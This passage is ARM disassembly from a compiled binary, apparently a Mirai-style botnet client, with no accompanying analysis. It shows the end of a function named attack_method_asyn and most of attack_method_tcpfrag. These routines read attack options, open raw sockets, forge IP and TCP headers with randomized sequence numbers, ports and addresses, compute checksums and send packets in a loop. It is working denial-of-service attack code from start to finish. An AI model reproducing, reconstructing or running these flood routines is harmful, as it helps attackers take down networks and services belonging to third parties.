    b39c:	e1822280 	orr	r2, r2, r0, lsl #5
    b3a0:	e59d3064 	ldr	r3, [sp, #100]	; 0x64
    b3a4:	e5c1200d 	strb	r2, [r1, #13]
    b3a8:	e5813004 	str	r3, [r1, #4]
    b3ac:	e5d1300d 	ldrb	r3, [r1, #13]
    b3b0:	e59d0010 	ldr	r0, [sp, #16]
    b3b4:	e3c33010 	bic	r3, r3, #16
    b3b8:	e1833200 	orr	r3, r3, r0, lsl #4
    b3bc:	e5c1300d 	strb	r3, [r1, #13]
    b3c0:	e5d1200d 	ldrb	r2, [r1, #13]
    b3c4:	e59d3014 	ldr	r3, [sp, #20]
    b3c8:	e3c22008 	bic	r2, r2, #8
    b3cc:	e1822183 	orr	r2, r2, r3, lsl #3
    b3d0:	e1c150b2 	strh	r5, [r1, #2]
    b3d4:	e5c1200d 	strb	r2, [r1, #13]
    b3d8:	e5d1300d 	ldrb	r3, [r1, #13]
    b3dc:	e59d0018 	ldr	r0, [sp, #24]
    b3e0:	e3c33004 	bic	r3, r3, #4
    b3e4:	e1833100 	orr	r3, r3, r0, lsl #2
    b3e8:	e5c1300d 	strb	r3, [r1, #13]
    b3ec:	e5d1200d 	ldrb	r2, [r1, #13]
    b3f0:	e59d301c 	ldr	r3, [sp, #28]
    b3f4:	e3c22002 	bic	r2, r2, #2
    b3f8:	e1822083 	orr	r2, r2, r3, lsl #1
    b3fc:	e5c1200d 	strb	r2, [r1, #13]
    b400:	e5d1300d 	ldrb	r3, [r1, #13]
    b404:	e59d0020 	ldr	r0, [sp, #32]
    b408:	e3c33001 	bic	r3, r3, #1
    b40c:	e1803003 	orr	r3, r0, r3
    b410:	e5c1300d 	strb	r3, [r1, #13]
    b414:	e3a02004 	mov	r2, #4
    b418:	e3a01002 	mov	r1, #2
    b41c:	e5c41028 	strb	r1, [r4, #40]	; 0x28
    b420:	e5c42029 	strb	r2, [r4, #41]	; 0x29
    b424:	eb001bfd 	bl	12420 <rand_next>
    b428:	e200000f 	and	r0, r0, #15
    b42c:	e2800e57 	add	r0, r0, #1392	; 0x570
    b430:	e2800008 	add	r0, r0, #8
    b434:	e1a00800 	lsl	r0, r0, #16
    b438:	e1a03420 	lsr	r3, r0, #8
    b43c:	e2033cff 	and	r3, r3, #65280	; 0xff00
    b440:	e1833c20 	orr	r3, r3, r0, lsr #24
    b444:	e1c432ba 	strh	r3, [r4, #42]	; 0x2a
    b448:	e3a03004 	mov	r3, #4
    b44c:	e5c4302c 	strb	r3, [r4, #44]	; 0x2c
    b450:	e3a0200a 	mov	r2, #10
    b454:	e3a03008 	mov	r3, #8
    b458:	e3a00002 	mov	r0, #2
    b45c:	e5c4302e 	strb	r3, [r4, #46]	; 0x2e
    b460:	e5c4202f 	strb	r2, [r4, #47]	; 0x2f
    b464:	e5c4002d 	strb	r0, [r4, #45]	; 0x2d
    b468:	eb001bec 	bl	12420 <rand_next>
    b46c:	e3a02006 	mov	r2, #6
    b470:	e5c4203b 	strb	r2, [r4, #59]	; 0x3b
    b474:	e3a01003 	mov	r1, #3
    b478:	e3a03000 	mov	r3, #0
    b47c:	e3a02001 	mov	r2, #1
    b480:	e5840030 	str	r0, [r4, #48]	; 0x30
    b484:	e5843034 	str	r3, [r4, #52]	; 0x34
    b488:	e5c42038 	strb	r2, [r4, #56]	; 0x38
    b48c:	e5c4103a 	strb	r1, [r4, #58]	; 0x3a
    b490:	e5c41039 	strb	r1, [r4, #57]	; 0x39
    b494:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    b498:	e0834002 	add	r4, r3, r2
    b49c:	e1540007 	cmp	r4, r7
    b4a0:	e58d406c 	str	r4, [sp, #108]	; 0x6c
    b4a4:	baffff90 	blt	b2ec <attack_method_asyn+0x2cc>
    b4a8:	e3a03000 	mov	r3, #0
    b4ac:	e3570000 	cmp	r7, #0
    b4b0:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    b4b4:	0afffffb 	beq	b4a8 <attack_method_asyn+0x488>
    b4b8:	e1a00003 	mov	r0, r3
    b4bc:	e1a03280 	lsl	r3, r0, #5
    b4c0:	e0433180 	sub	r3, r3, r0, lsl #3
    b4c4:	e0833008 	add	r3, r3, r8
    b4c8:	e5d32014 	ldrb	r2, [r3, #20]
    b4cc:	e7995100 	ldr	r5, [r9, r0, lsl #2]
    b4d0:	e352001f 	cmp	r2, #31
    b4d4:	e2856014 	add	r6, r5, #20
    b4d8:	9a00003b 	bls	b5cc <attack_method_asyn+0x5ac>
    b4dc:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    b4e0:	e3730001 	cmn	r3, #1
    b4e4:	0a000050 	beq	b62c <attack_method_asyn+0x60c>
    b4e8:	e3a04801 	mov	r4, #65536	; 0x10000
    b4ec:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    b4f0:	e2444001 	sub	r4, r4, #1
    b4f4:	e1500004 	cmp	r0, r4
    b4f8:	0a000052 	beq	b648 <attack_method_asyn+0x628>
    b4fc:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    b500:	e1510004 	cmp	r1, r4
    b504:	0a000054 	beq	b65c <attack_method_asyn+0x63c>
    b508:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    b50c:	e1520004 	cmp	r2, r4
    b510:	0a000056 	beq	b670 <attack_method_asyn+0x650>
    b514:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    b518:	e1530004 	cmp	r3, r4
    b51c:	0a000058 	beq	b684 <attack_method_asyn+0x664>
    b520:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    b524:	e1500004 	cmp	r0, r4
    b528:	0a00005a 	beq	b698 <attack_method_asyn+0x678>
    b52c:	e35b0000 	cmp	fp, #0
    b530:	1a00005c 	bne	b6a8 <attack_method_asyn+0x688>
    b534:	e3a01000 	mov	r1, #0
    b538:	e1c510ba 	strh	r1, [r5, #10]
    b53c:	e1a00005 	mov	r0, r5
    b540:	e3a01014 	mov	r1, #20
    b544:	eb000c9c 	bl	e7bc <checksum_generic>
    b548:	e3a02000 	mov	r2, #0
    b54c:	e1c500ba 	strh	r0, [r5, #10]
    b550:	e1a01006 	mov	r1, r6
    b554:	e1c621b0 	strh	r2, [r6, #16]
    b558:	e3a03028 	mov	r3, #40	; 0x28
    b55c:	e3a02b0a 	mov	r2, #10240	; 0x2800
    b560:	e1a00005 	mov	r0, r5
    b564:	eb000ca8 	bl	e80c <checksum_tcpudp>
    b568:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    b56c:	e1a0e283 	lsl	lr, r3, #5
    b570:	e1c601b0 	strh	r0, [r6, #16]
    b574:	e04ee183 	sub	lr, lr, r3, lsl #3
    b578:	e1d660b2 	ldrh	r6, [r6, #2]
    b57c:	e08ee008 	add	lr, lr, r8
    b580:	e1ce60b2 	strh	r6, [lr, #2]
    b584:	e3a03901 	mov	r3, #16384	; 0x4000
    b588:	e3a0c010 	mov	ip, #16
    b58c:	e1a01005 	mov	r1, r5
    b590:	e1a0000a 	mov	r0, sl
    b594:	e3a0203c 	mov	r2, #60	; 0x3c
    b598:	e58de000 	str	lr, [sp]
    b59c:	e58dc004 	str	ip, [sp, #4]
    b5a0:	eb0035ab 	bl	18c54 <__libc_sendto>
    b5a4:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    b5a8:	e2830001 	add	r0, r3, #1
    b5ac:	e1500007 	cmp	r0, r7
    b5b0:	e58d006c 	str	r0, [sp, #108]	; 0x6c
    b5b4:	baffffc0 	blt	b4bc <attack_method_asyn+0x49c>
    b5b8:	e3a03000 	mov	r3, #0
    b5bc:	e3570000 	cmp	r7, #0
    b5c0:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    b5c4:	0affffb7 	beq	b4a8 <attack_method_asyn+0x488>
    b5c8:	eaffffba 	b	b4b8 <attack_method_asyn+0x498>
    b5cc:	e5934010 	ldr	r4, [r3, #16]
    b5d0:	eb001b92 	bl	12420 <rand_next>
    b5d4:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    b5d8:	e1a01283 	lsl	r1, r3, #5
    b5dc:	e0411183 	sub	r1, r1, r3, lsl #3
    b5e0:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    b5e4:	e1a02c24 	lsr	r2, r4, #24
    b5e8:	e182242c 	orr	r2, r2, ip, lsr #8
    b5ec:	e0811008 	add	r1, r1, r8
    b5f0:	e2043cff 	and	r3, r4, #65280	; 0xff00
    b5f4:	e5d1c014 	ldrb	ip, [r1, #20]
    b5f8:	e1822403 	orr	r2, r2, r3, lsl #8
    b5fc:	e1822c04 	orr	r2, r2, r4, lsl #24
    b600:	e0822c30 	add	r2, r2, r0, lsr ip
    b604:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    b608:	e1a03c22 	lsr	r3, r2, #24
    b60c:	e1833420 	orr	r3, r3, r0, lsr #8
    b610:	e2021cff 	and	r1, r2, #65280	; 0xff00
    b614:	e1833401 	orr	r3, r3, r1, lsl #8
    b618:	e1833c02 	orr	r3, r3, r2, lsl #24
    b61c:	e5853010 	str	r3, [r5, #16]
    b620:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    b624:	e3730001 	cmn	r3, #1
    b628:	1affffae 	bne	b4e8 <attack_method_asyn+0x4c8>
    b62c:	eb001b7b 	bl	12420 <rand_next>
    b630:	e3a04801 	mov	r4, #65536	; 0x10000
    b634:	e585000c 	str	r0, [r5, #12]
    b638:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    b63c:	e2444001 	sub	r4, r4, #1
    b640:	e1500004 	cmp	r0, r4
    b644:	1affffac 	bne	b4fc <attack_method_asyn+0x4dc>
    b648:	eb001b74 	bl	12420 <rand_next>
    b64c:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    b650:	e1510004 	cmp	r1, r4
    b654:	e1c500b4 	strh	r0, [r5, #4]
    b658:	1affffaa 	bne	b508 <attack_method_asyn+0x4e8>
    b65c:	eb001b6f 	bl	12420 <rand_next>
    b660:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    b664:	e1520004 	cmp	r2, r4
    b668:	e1c501b4 	strh	r0, [r5, #20]
    b66c:	1affffa8 	bne	b514 <attack_method_asyn+0x4f4>
    b670:	eb001b6a 	bl	12420 <rand_next>
    b674:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    b678:	e1530004 	cmp	r3, r4
    b67c:	e1c600b2 	strh	r0, [r6, #2]
    b680:	1affffa6 	bne	b520 <attack_method_asyn+0x500>
    b684:	eb001b65 	bl	12420 <rand_next>
    b688:	e5860004 	str	r0, [r6, #4]
    b68c:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    b690:	e1500004 	cmp	r0, r4
    b694:	1affffa4 	bne	b52c <attack_method_asyn+0x50c>
    b698:	eb001b60 	bl	12420 <rand_next>
    b69c:	e35b0000 	cmp	fp, #0
    b6a0:	e5860008 	str	r0, [r6, #8]
    b6a4:	0affffa2 	beq	b534 <attack_method_asyn+0x514>
    b6a8:	eb001b5c 	bl	12420 <rand_next>
    b6ac:	e1c601b2 	strh	r0, [r6, #18]
    b6b0:	eaffff9f 	b	b534 <attack_method_asyn+0x514>
    b6b4:	e1a0000a 	mov	r0, sl
    b6b8:	eb003f8c 	bl	1b4f0 <__GI___libc_close>
    b6bc:	e28dd074 	add	sp, sp, #116	; 0x74
    b6c0:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    b6c4:	e12fff1e 	bx	lr
    b6c8:	0002c58c 	andeq	ip, r2, ip, lsl #11

0000b6cc <attack_method_tcpfrag>:
    b6cc:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    b6d0:	e1a08001 	mov	r8, r1
    b6d4:	e24dd074 	sub	sp, sp, #116	; 0x74
    b6d8:	e3a01004 	mov	r1, #4
    b6dc:	e1a04002 	mov	r4, r2
    b6e0:	e1a05003 	mov	r5, r3
    b6e4:	e1a07000 	mov	r7, r0
    b6e8:	eb00386f 	bl	198ac <calloc>
    b6ec:	e1a01005 	mov	r1, r5
    b6f0:	e3a02002 	mov	r2, #2
    b6f4:	e3a03000 	mov	r3, #0
    b6f8:	e1a09000 	mov	r9, r0
    b6fc:	e1a00004 	mov	r0, r4
    b700:	ebfffb86 	bl	a520 <attack_get_opt_int>
    b704:	e3a03801 	mov	r3, #65536	; 0x10000
    b708:	e1a0c000 	mov	ip, r0
    b70c:	e20cc0ff 	and	ip, ip, #255	; 0xff
    b710:	e2433001 	sub	r3, r3, #1
    b714:	e3a02003 	mov	r2, #3
    b718:	e1a01005 	mov	r1, r5
    b71c:	e1a00004 	mov	r0, r4
    b720:	e58dc048 	str	ip, [sp, #72]	; 0x48
    b724:	ebfffb7d 	bl	a520 <attack_get_opt_int>
    b728:	e1a01005 	mov	r1, r5
    b72c:	e58d0024 	str	r0, [sp, #36]	; 0x24
    b730:	e3a02004 	mov	r2, #4
    b734:	e3a03040 	mov	r3, #64	; 0x40
    b738:	e1a00004 	mov	r0, r4
    b73c:	ebfffb77 	bl	a520 <attack_get_opt_int>
    b740:	e1a0c000 	mov	ip, r0
    b744:	e20cc0ff 	and	ip, ip, #255	; 0xff
    b748:	e1a01005 	mov	r1, r5
    b74c:	e3a02005 	mov	r2, #5
    b750:	e3a03000 	mov	r3, #0
    b754:	e1a00004 	mov	r0, r4
    b758:	e58dc050 	str	ip, [sp, #80]	; 0x50
    b75c:	ebfffb6f 	bl	a520 <attack_get_opt_int>
    b760:	e3a03801 	mov	r3, #65536	; 0x10000
    b764:	e1a0c000 	mov	ip, r0
    b768:	e20cc0ff 	and	ip, ip, #255	; 0xff
    b76c:	e2433001 	sub	r3, r3, #1
    b770:	e3a02006 	mov	r2, #6
    b774:	e1a01005 	mov	r1, r5
    b778:	e1a00004 	mov	r0, r4
    b77c:	e58dc054 	str	ip, [sp, #84]	; 0x54
    b780:	ebfffb66 	bl	a520 <attack_get_opt_int>
    b784:	e3a03801 	mov	r3, #65536	; 0x10000
    b788:	e1a01005 	mov	r1, r5
    b78c:	e2433001 	sub	r3, r3, #1
    b790:	e3a02007 	mov	r2, #7
    b794:	e1a0b000 	mov	fp, r0
    b798:	e1a00004 	mov	r0, r4
    b79c:	ebfffb5f 	bl	a520 <attack_get_opt_int>
    b7a0:	e3a03801 	mov	r3, #65536	; 0x10000
    b7a4:	e1a01005 	mov	r1, r5
    b7a8:	e2433001 	sub	r3, r3, #1
    b7ac:	e3a02011 	mov	r2, #17
    b7b0:	e1a06000 	mov	r6, r0
    b7b4:	e1a00004 	mov	r0, r4
    b7b8:	ebfffb58 	bl	a520 <attack_get_opt_int>
    b7bc:	e1a01005 	mov	r1, r5
    b7c0:	e58d0028 	str	r0, [sp, #40]	; 0x28
    b7c4:	e3a02012 	mov	r2, #18
    b7c8:	e3a03000 	mov	r3, #0
    b7cc:	e1a00004 	mov	r0, r4
    b7d0:	ebfffb52 	bl	a520 <attack_get_opt_int>
    b7d4:	e1a01005 	mov	r1, r5
    b7d8:	e58d002c 	str	r0, [sp, #44]	; 0x2c
    b7dc:	e3a0200b 	mov	r2, #11
    b7e0:	e3a03001 	mov	r3, #1
    b7e4:	e1a00004 	mov	r0, r4
    b7e8:	ebfffb4c 	bl	a520 <attack_get_opt_int>
    b7ec:	e1a01005 	mov	r1, r5
    b7f0:	e58d0030 	str	r0, [sp, #48]	; 0x30
    b7f4:	e3a0200c 	mov	r2, #12
    b7f8:	e3a03001 	mov	r3, #1
    b7fc:	e1a00004 	mov	r0, r4
    b800:	ebfffb46 	bl	a520 <attack_get_opt_int>
    b804:	e1a01005 	mov	r1, r5
    b808:	e58d0034 	str	r0, [sp, #52]	; 0x34
    b80c:	e3a0200d 	mov	r2, #13
    b810:	e3a03001 	mov	r3, #1
    b814:	e1a00004 	mov	r0, r4
    b818:	ebfffb40 	bl	a520 <attack_get_opt_int>
    b81c:	e1a01005 	mov	r1, r5
    b820:	e58d0038 	str	r0, [sp, #56]	; 0x38
    b824:	e3a0200e 	mov	r2, #14
    b828:	e3a03001 	mov	r3, #1
    b82c:	e1a00004 	mov	r0, r4
    b830:	ebfffb3a 	bl	a520 <attack_get_opt_int>
    b834:	e1a01005 	mov	r1, r5
    b838:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    b83c:	e3a0200f 	mov	r2, #15
    b840:	e3a03001 	mov	r3, #1
    b844:	e1a00004 	mov	r0, r4
    b848:	ebfffb34 	bl	a520 <attack_get_opt_int>
    b84c:	e1a01005 	mov	r1, r5
    b850:	e58d0040 	str	r0, [sp, #64]	; 0x40
    b854:	e3a02010 	mov	r2, #16
    b858:	e3a03001 	mov	r3, #1
    b85c:	e1a00004 	mov	r0, r4
    b860:	ebfffb2e 	bl	a520 <attack_get_opt_int>
    b864:	e59f2508 	ldr	r2, [pc, #1288]	; bd74 <attack_method_tcpfrag+0x6a8>
    b868:	e58d0044 	str	r0, [sp, #68]	; 0x44
    b86c:	e5923000 	ldr	r3, [r2]
    b870:	e1a01005 	mov	r1, r5
    b874:	e3a02019 	mov	r2, #25
    b878:	e1a00004 	mov	r0, r4
    b87c:	ebfffb0c 	bl	a4b4 <attack_get_opt_ip>
    b880:	e3a01003 	mov	r1, #3
    b884:	e58d0060 	str	r0, [sp, #96]	; 0x60
    b888:	e3a02006 	mov	r2, #6
    b88c:	e3a00002 	mov	r0, #2
    b890:	eb003523 	bl	18d24 <__GI_socket>
    b894:	e3700001 	cmn	r0, #1
    b898:	e1a0a000 	mov	sl, r0
    b89c:	0a000131 	beq	bd68 <attack_method_tcpfrag+0x69c>
    b8a0:	e28d3070 	add	r3, sp, #112	; 0x70
    b8a4:	e3a02001 	mov	r2, #1
    b8a8:	e5232004 	str	r2, [r3, #-4]!
    b8ac:	e3a0c004 	mov	ip, #4
    b8b0:	e3a01000 	mov	r1, #0
    b8b4:	e2822002 	add	r2, r2, #2
    b8b8:	e58dc000 	str	ip, [sp]
    b8bc:	eb003506 	bl	18cdc <__GI_setsockopt>
    b8c0:	e3700001 	cmn	r0, #1
    b8c4:	0a000125 	beq	bd60 <attack_method_tcpfrag+0x694>
    b8c8:	e59d1024 	ldr	r1, [sp, #36]	; 0x24
    b8cc:	e3a02000 	mov	r2, #0
    b8d0:	e1a00801 	lsl	r0, r1, #16
    b8d4:	e1a0480b 	lsl	r4, fp, #16
    b8d8:	e1a05806 	lsl	r5, r6, #16
    b8dc:	e58d206c 	str	r2, [sp, #108]	; 0x6c
    b8e0:	e59d2030 	ldr	r2, [sp, #48]	; 0x30
    b8e4:	e1a03820 	lsr	r3, r0, #16
    b8e8:	e1a06824 	lsr	r6, r4, #16
    b8ec:	e1a01825 	lsr	r1, r5, #16
    b8f0:	e3570000 	cmp	r7, #0
    b8f4:	e58d304c 	str	r3, [sp, #76]	; 0x4c
    b8f8:	e58d6058 	str	r6, [sp, #88]	; 0x58
    b8fc:	e58d105c 	str	r1, [sp, #92]	; 0x5c
    b900:	e202b0ff 	and	fp, r2, #255	; 0xff
    b904:	0a000092 	beq	bb54 <attack_method_tcpfrag+0x488>
    b908:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    b90c:	e1a0e803 	lsl	lr, r3, #16
    b910:	e1a03c06 	lsl	r3, r6, #24
    b914:	e59d604c 	ldr	r6, [sp, #76]	; 0x4c
    b918:	e1a02c01 	lsl	r2, r1, #24
    b91c:	e1a0140e 	lsl	r1, lr, #8
    b920:	e1a01821 	lsr	r1, r1, #16
    b924:	e1a00c20 	lsr	r0, r0, #24
    b928:	e206c0ff 	and	ip, r6, #255	; 0xff
    b92c:	e181ec2e 	orr	lr, r1, lr, lsr #24
    b930:	e180c40c 	orr	ip, r0, ip, lsl #8
    b934:	e28d0030 	add	r0, sp, #48	; 0x30
    b938:	e8900003 	ldm	r0, {r0, r1}
    b93c:	e1a03823 	lsr	r3, r3, #16
    b940:	e1a02822 	lsr	r2, r2, #16
    b944:	e2000001 	and	r0, r0, #1
    b948:	e2011001 	and	r1, r1, #1
    b94c:	e1836c24 	orr	r6, r3, r4, lsr #24
    b950:	e1825c25 	orr	r5, r2, r5, lsr #24
    b954:	e58d000c 	str	r0, [sp, #12]
    b958:	e58d1010 	str	r1, [sp, #16]
    b95c:	e28d2038 	add	r2, sp, #56	; 0x38
    b960:	e892000c 	ldm	r2, {r2, r3}
    b964:	e28d0040 	add	r0, sp, #64	; 0x40
    b968:	e8900003 	ldm	r0, {r0, r1}
    b96c:	e2022001 	and	r2, r2, #1
    b970:	e2033001 	and	r3, r3, #1
    b974:	e2000001 	and	r0, r0, #1
    b978:	e2011001 	and	r1, r1, #1
    b97c:	e58de064 	str	lr, [sp, #100]	; 0x64
    b980:	e58dc008 	str	ip, [sp, #8]
    b984:	e58d2014 	str	r2, [sp, #20]
    b988:	e58d3018 	str	r3, [sp, #24]
    b98c:	e58d001c 	str	r0, [sp, #28]
    b990:	e58d1020 	str	r1, [sp, #32]
    b994:	e3a04000 	mov	r4, #0
    b998:	e3a01001 	mov	r1, #1
    b99c:	e3a00080 	mov	r0, #128	; 0x80
    b9a0:	eb0037c1 	bl	198ac <calloc>
    b9a4:	e59d206c 	ldr	r2, [sp, #108]	; 0x6c
    b9a8:	e7890104 	str	r0, [r9, r4, lsl #2]
    b9ac:	e1a03282 	lsl	r3, r2, #5
    b9b0:	e7994102 	ldr	r4, [r9, r2, lsl #2]
    b9b4:	e0433182 	sub	r3, r3, r2, lsl #3
    b9b8:	e0830008 	add	r0, r3, r8
    b9bc:	e5d43000 	ldrb	r3, [r4]
    b9c0:	e3c330b0 	bic	r3, r3, #176	; 0xb0
    b9c4:	e3833040 	orr	r3, r3, #64	; 0x40
    b9c8:	e5c43000 	strb	r3, [r4]
    b9cc:	e5d42000 	ldrb	r2, [r4]
    b9d0:	e3c2200a 	bic	r2, r2, #10
    b9d4:	e3822005 	orr	r2, r2, #5
    b9d8:	e59d3054 	ldr	r3, [sp, #84]	; 0x54
    b9dc:	e5c42000 	strb	r2, [r4]
    b9e0:	e59d1048 	ldr	r1, [sp, #72]	; 0x48
    b9e4:	e5c41001 	strb	r1, [r4, #1]
    b9e8:	e59d2050 	ldr	r2, [sp, #80]	; 0x50
    b9ec:	e3530000 	cmp	r3, #0
    b9f0:	e3a03b0f 	mov	r3, #15360	; 0x3c00
    b9f4:	e5c42008 	strb	r2, [r4, #8]
    b9f8:	e1c430b2 	strh	r3, [r4, #2]
    b9fc:	e3a03006 	mov	r3, #6
    ba00:	e59d1008 	ldr	r1, [sp, #8]
    ba04:	13a02040 	movne	r2, #64	; 0x40
    ba08:	e5c43009 	strb	r3, [r4, #9]
    ba0c:	11c420b6 	strhne	r2, [r4, #6]
    ba10:	e59d2060 	ldr	r2, [sp, #96]	; 0x60
    ba14:	e584200c 	str	r2, [r4, #12]
    ba18:	e5903010 	ldr	r3, [r0, #16]
    ba1c:	e1c410b4 	strh	r1, [r4, #4]
    ba20:	e5843010 	str	r3, [r4, #16]
    ba24:	e1c461b4 	strh	r6, [r4, #20]
    ba28:	e2841014 	add	r1, r4, #20
    ba2c:	e5d1300c 	ldrb	r3, [r1, #12]
    ba30:	e5d1200d 	ldrb	r2, [r1, #13]
    ba34:	e59d000c 	ldr	r0, [sp, #12]
    ba38:	e3c33050 	bic	r3, r3, #80	; 0x50
    ba3c:	e38330a0 	orr	r3, r3, #160	; 0xa0
    ba40:	e3c22020 	bic	r2, r2, #32
    ba44:	e5c1300c 	strb	r3, [r1, #12]
    ba48:	e1822280 	orr	r2, r2, r0, lsl #5
    ba4c:	e59d3064 	ldr	r3, [sp, #100]	; 0x64
    ba50:	e5c1200d 	strb	r2, [r1, #13]
    ba54:	e5813004 	str	r3, [r1, #4]
    ba58:	e5d1300d 	ldrb	r3, [r1, #13]
    ba5c:	e59d0010 	ldr	r0, [sp, #16]
    ba60:	e3c33010 	bic	r3, r3, #16
    ba64:	e1833200 	orr	r3, r3, r0, lsl #4
    ba68:	e5c1300d 	strb	r3, [r1, #13]
    ba6c:	e5d1200d 	ldrb	r2, [r1, #13]
    ba70:	e59d3014 	ldr	r3, [sp, #20]
    ba74:	e3c22008 	bic	r2, r2, #8
    ba78:	e1822183 	orr	r2, r2, r3, lsl #3
    ba7c:	e1c150b2 	strh	r5, [r1, #2]
    ba80:	e5c1200d 	strb	r2, [r1, #13]
    ba84:	e5d1300d 	ldrb	r3, [r1, #13]
    ba88:	e59d0018 	ldr	r0, [sp, #24]
    ba8c:	e3c33004 	bic	r3, r3, #4
    ba90:	e1833100 	orr	r3, r3, r0, lsl #2
    ba94:	e5c1300d 	strb	r3, [r1, #13]
    ba98:	e5d1200d 	ldrb	r2, [r1, #13]
    ba9c:	e59d301c 	ldr	r3, [sp, #28]
    baa0:	e3c22002 	bic	r2, r2, #2
    baa4:	e1822083 	orr	r2, r2, r3, lsl #1
    baa8:	e5c1200d 	strb	r2, [r1, #13]
    baac:	e5d1300d 	ldrb	r3, [r1, #13]
    bab0:	e59d0020 	ldr	r0, [sp, #32]
    bab4:	e3c33001 	bic	r3, r3, #1
    bab8:	e1803003 	orr	r3, r0, r3
    babc:	e5c1300d 	strb	r3, [r1, #13]
    bac0:	e3a02004 	mov	r2, #4
    bac4:	e3a01002 	mov	r1, #2
    bac8:	e5c41028 	strb	r1, [r4, #40]	; 0x28
    bacc:	e5c42029 	strb	r2, [r4, #41]	; 0x29
    bad0:	eb001a52 	bl	12420 <rand_next>
    bad4:	e200000f 	and	r0, r0, #15
    bad8:	e2800e57 	add	r0, r0, #1392	; 0x570
    badc:	e2800008 	add	r0, r0, #8
    bae0:	e1a00800 	lsl	r0, r0, #16
    bae4:	e1a03420 	lsr	r3, r0, #8
    bae8:	e2033cff 	and	r3, r3, #65280	; 0xff00
    baec:	e1833c20 	orr	r3, r3, r0, lsr #24
    baf0:	e1c432ba 	strh	r3, [r4, #42]	; 0x2a
    baf4:	e3a03004 	mov	r3, #4
    baf8:	e5c4302c 	strb	r3, [r4, #44]	; 0x2c
    bafc:	e3a0200a 	mov	r2, #10
    bb00:	e3a03008 	mov	r3, #8
    bb04:	e3a00002 	mov	r0, #2
    bb08:	e5c4302e 	strb	r3, [r4, #46]	; 0x2e
    bb0c:	e5c4202f 	strb	r2, [r4, #47]	; 0x2f
    bb10:	e5c4002d 	strb	r0, [r4, #45]	; 0x2d
    bb14:	eb001a41 	bl	12420 <rand_next>
    bb18:	e3a02006 	mov	r2, #6
    bb1c:	e5c4203b 	strb	r2, [r4, #59]	; 0x3b
    bb20:	e3a01003 	mov	r1, #3
    bb24:	e3a03000 	mov	r3, #0
    bb28:	e3a02001 	mov	r2, #1
    bb2c:	e5840030 	str	r0, [r4, #48]	; 0x30
    bb30:	e5843034 	str	r3, [r4, #52]	; 0x34
    bb34:	e5c42038 	strb	r2, [r4, #56]	; 0x38
    bb38:	e5c4103a 	strb	r1, [r4, #58]	; 0x3a
    bb3c:	e5c41039 	strb	r1, [r4, #57]	; 0x39
    bb40:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    bb44:	e0834002 	add	r4, r3, r2
    bb48:	e1540007 	cmp	r4, r7
    bb4c:	e58d406c 	str	r4, [sp, #108]	; 0x6c
    bb50:	baffff90 	blt	b998 <attack_method_tcpfrag+0x2cc>
    bb54:	e3a03000 	mov	r3, #0
    bb58:	e3570000 	cmp	r7, #0
    bb5c:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    bb60:	0afffffb 	beq	bb54 <attack_method_tcpfrag+0x488>
    bb64:	e1a00003 	mov	r0, r3
    bb68:	e1a03280 	lsl	r3, r0, #5
    bb6c:	e0433180 	sub	r3, r3, r0, lsl #3
    bb70:	e0833008 	add	r3, r3, r8
    bb74:	e5d32014 	ldrb	r2, [r3, #20]
    bb78:	e7995100 	ldr	r5, [r9, r0, lsl #2]
    bb7c:	e352001f 	cmp	r2, #31
    bb80:	e2856014 	add	r6, r5, #20
    bb84:	9a00003b 	bls	bc78 <attack_method_tcpfrag+0x5ac>
    bb88:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    bb8c:	e3730001 	cmn	r3, #1
    bb90:	0a000050 	beq	bcd8 <attack_method_tcpfrag+0x60c>
    bb94:	e3a04801 	mov	r4, #65536	; 0x10000
    bb98:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    bb9c:	e2444001 	sub	r4, r4, #1
    bba0:	e1500004 	cmp	r0, r4
    bba4:	0a000052 	beq	bcf4 <attack_method_tcpfrag+0x628>
    bba8:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    bbac:	e1510004 	cmp	r1, r4
    bbb0:	0a000054 	beq	bd08 <attack_method_tcpfrag+0x63c>
    bbb4:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    bbb8:	e1520004 	cmp	r2, r4
    bbbc:	0a000056 	beq	bd1c <attack_method_tcpfrag+0x650>
    bbc0:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    bbc4:	e1530004 	cmp	r3, r4
    bbc8:	0a000058 	beq	bd30 <attack_method_tcpfrag+0x664>
    bbcc:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    bbd0:	e1500004 	cmp	r0, r4
    bbd4:	0a00005a 	beq	bd44 <attack_method_tcpfrag+0x678>
    bbd8:	e35b0000 	cmp	fp, #0
    bbdc:	1a00005c 	bne	bd54 <attack_method_tcpfrag+0x688>
    bbe0:	e3a01000 	mov	r1, #0
    bbe4:	e1c510ba 	strh	r1, [r5, #10]
    bbe8:	e1a00005 	mov	r0, r5
    bbec:	e3a01014 	mov	r1, #20
    bbf0:	eb000af1 	bl	e7bc <checksum_generic>
    bbf4:	e3a02000 	mov	r2, #0
    bbf8:	e1c500ba 	strh	r0, [r5, #10]
